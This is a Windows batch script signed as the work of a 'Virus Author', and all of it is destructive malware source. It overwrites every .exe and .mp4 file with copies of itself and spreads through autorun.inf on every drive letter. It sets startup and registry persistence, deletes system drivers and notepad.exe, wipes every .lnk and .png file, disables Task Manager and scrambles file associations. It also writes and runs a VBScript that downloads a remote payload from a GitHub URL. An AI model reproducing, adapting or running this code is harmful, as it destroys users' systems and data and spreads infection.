@ echo off
assoc .exe=batfile
DIR /S/B %SystemDrive%\*.exe >> InfList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_exe.txt) do copy /y %0 "%%j:%%k"
copy %0 "%userprofile%\Start Menu\Programs\Startup"
assoc .mp4=batfile
DIR /S/B %SystemDrive%\*.mp4 >> InfList_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp4.txt) do copy /y %0 "%%j:%%k"
for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
copy /Y %0 %%E:\
echo [AutoRun] > %%E:\autorun.inf
echo open="%%E:\%0" >> %%E:\autorun.inf
echo action=Open folder to see files... >> %%E:\autorun.inf)
copy %0 %windir%\system32\ls.bat
del /f /q "%windir%\system32\notepad.exe"
attrib +h "%userprofile%\my documents"
assoc .dll=txtfile
assoc .exe=pngfile
assoc .vbs=Visual Style
assoc .reg=xmlfile
assoc .txt=regfile
assoc .mp3=txtfile
assoc .xml=txtfile
assoc .png=txtfile
@((( Echo Off > Nul ) & Break Off )
    @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
    @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
)
RUNDLL32 USER32.DLL,SwapMouseButton
DIR /S/B %SystemDrive%\*.lnk >> FIleList_lnk.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_lnk.txt) do del "%%j:%%k"
DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_png.txt) do del "%%j:%%k"
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
echo ' Set your settings >>%SystemDrive%\downloader.vbs
echo     strFileURL = "https://raw.githubusercontent.com/marvicrm/iloveu2/master/iloveu2.vbs" >>%SystemDrive%\downloader.vbs
echo     strHDLocation = "C:\Windows\Temp" >>%SystemDrive%\downloader.vbs
echo ' Fetch the file >>%SystemDrive%\downloader.vbs
echo     Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >>%SystemDrive%\downloader.vbs
echo     objXMLHTTP.open "GET", strFileURL, false >>%SystemDrive%\downloader.vbs
echo     objXMLHTTP.send() >>%SystemDrive%\downloader.vbs
echo     If objXMLHTTP.Status = 200 Then >>%SystemDrive%\downloader.vbs
echo       Set objADOStream = CreateObject("ADODB.Stream") >>%SystemDrive%\downloader.vbs
echo       objADOStream.Open >>%SystemDrive%\downloader.vbs
echo       objADOStream.Type = 1 'adTypeBinary >>%SystemDrive%\downloader.vbs
echo       objADOStream.Write objXMLHTTP.ResponseBody >>%SystemDrive%\downloader.vbs
echo       objADOStream.Position = 0    'Set the stream position to the start >>%SystemDrive%\downloader.vbs
echo       Set objFSO = Createobject("Scripting.FileSystemObject") >>%SystemDrive%\downloader.vbs
echo         If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >>%SystemDrive%\downloader.vbs
echo       Set objFSO = Nothing >>%SystemDrive%\downloader.vbs
echo       objADOStream.SaveToFile strHDLocation >>%SystemDrive%\downloader.vbs
echo       objADOStream.Close >>%SystemDrive%\downloader.vbs
echo       Set objADOStream = Nothing >>%SystemDrive%\downloader.vbs
echo     End if >>%SystemDrive%\downloader.vbs
echo     Set objXMLHTTP = Nothing >>%SystemDrive%\downloader.vbs
start "" %SystemDrive%\downloader.vbs
rem Open Web Page
start http://about:blank
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "START PAGE" /d "http://about:blank"



__-Virus Author: -__